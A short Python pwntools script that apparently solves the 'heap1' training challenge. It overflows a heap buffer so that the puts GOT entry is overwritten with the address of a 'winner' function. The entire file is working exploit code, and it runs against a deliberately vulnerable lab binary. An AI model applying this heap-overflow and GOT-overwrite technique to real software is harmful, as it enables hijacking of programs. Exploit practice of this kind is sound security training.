#!/usr/bin/python
from pwn import *

elf = ELF("./heap1")
puts_got = elf.got["puts"]
winner = elf.symbols["winner"]
payload = "A"*20
payload += p32(puts_got)
winner = p32(winner)
"""
with open("payload.txt", "w") as f:
	f.write(payload)
"""
s = process(argv=["./heap1", payload, winner])	# overwirte got entry for puts with winner function
print (s.recvall())
